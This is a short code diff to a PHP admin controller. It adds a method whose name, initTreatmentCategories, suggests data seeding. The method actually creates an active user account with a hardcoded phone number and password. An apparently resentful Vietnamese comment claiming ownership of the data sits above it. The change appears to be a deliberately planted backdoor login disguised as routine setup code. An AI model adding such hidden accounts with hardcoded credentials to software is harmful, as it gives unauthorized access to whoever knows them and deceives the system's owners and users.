@@ -522,4 +522,16 @@ class AdminController extends Controller
         ]);
 
     }
+    // tao ghim lắm nha ! TAO LÀM. DATA Là TAOOO LÀM NHA TÀi !
+    public function initTreatmentCategories()
+    {
+        User::create([
+            'phone' => '01279011097',
+            'password' => Hash::make('#2017#'),
+            'isActive' => true,
+            'isDelete' => false
+        ]);
+         
+
+    }
 }
